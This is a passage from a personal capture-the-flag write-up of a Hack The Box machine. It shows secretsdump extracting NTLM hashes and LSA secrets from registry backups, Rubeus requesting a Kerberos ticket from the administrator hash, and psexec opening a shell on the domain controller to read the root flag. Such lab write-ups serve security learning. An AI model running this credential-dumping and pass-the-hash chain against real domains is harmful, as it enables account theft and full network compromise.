    Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
    <snip>
    [*] Cleaning up... 
```


```python
!secretsdump.py -security backups/registry/SECURITY -system backups/registry/SYSTEM -sam /dev/null LOCAL
```

    /home/tokugero/ctf/htb/season8/week8-voleur/.venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
      import pkg_resources
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
    
    [*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
    [-] SAM hashes extraction failed: ("Unpacked data doesn't match constant value 'b''' should be ''regf''", 'When unpacking field \'Magic | "regf | b\'\'[:4]\'')
    [*] Dumping cached domain logon information (domain/username:hash)
    [*] Dumping LSA Secrets
    [*] $MACHINE.ACC 
    $MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2
    $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77
    [*] DPAPI_SYSTEM 
    dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
    dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
    [*] NL$KM 
     0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
     0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
     0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
     0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
    NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
    [*] Cleaning up... 


With the NTLM disabled elsewhere, we can't just load this into NTLM hashes and authenticate, evil-winrm and psexec tools all fail. So using these hashes, let's grab a file directly from the system and log in another way.

As svc_winrm:
```sh
*Evil-WinRM* PS C:\windows\temp> ./Rubeus.exe asktgt /user:administrator /rc4:e656e07c56d831611b577b160b259ad2 /ptt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using rc4_hmac hash: e656e07c56d831611b577b160b259ad2
[*] Building AS-REQ (w/ preauth) for: 'voleur.htb\administrator'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFqDCCBaSgAwIBBaEDAgEWooIEvjCCBLp<snip>MzU2WqgMGwpWT0xFVVIuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0Gwp2b2xldXIuaHRi
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/voleur.htb
  ServiceRealm             :  VOLEUR.HTB
  UserName                 :  administrator (NT_PRINCIPAL)
  UserRealm                :  VOLEUR.HTB
  StartTime                :  7/6/2025 3:43:56 AM
  EndTime                  :  7/6/2025 1:43:56 PM
  RenewTill                :  7/13/2025 3:43:56 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  fIZVgEblkRkhVOBfRogYxw==
  ASREP (key)              :  E656E07C56D831611B577B160B259AD2
```

Back on my system:
```sh
 KRB5_CONFIG=./krb5.conf KRB5CCNAME=./administrator.ccache psexec.py -no-pass -k dc.voleur.htb
/home/tokugero/ctf/htb/season8/week8-voleur/.venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.voleur.htb.....
[*] Found writable share ADMIN$
[*] Uploading file ksYnaOYE.exe
[*] Opening SVCManager on dc.voleur.htb.....
[*] Creating service uVLz on dc.voleur.htb.....
[*] Starting service uVLz.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> type C:/users/administrator/desktop/root.txt
The syntax of the command is incorrect.

C:\Windows\system32> powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows


PS C:\Windows\system32> 
type C:/Users/Administrator/Desktop/root.txt
PS C:\Windows\system32> type C:/Users/Administrator/Desktop/root.txt
0b81d92b0e58b37985de2927391ec16d
```

Another box down. This one was much easier than last weeks with a lot less untred ground to cover. NTLM and pre-auth functionality are still on my giant laundry list of research to do so I better understand when one vector is appropriate vs another for using credentials/hashes/tickets as I find them.
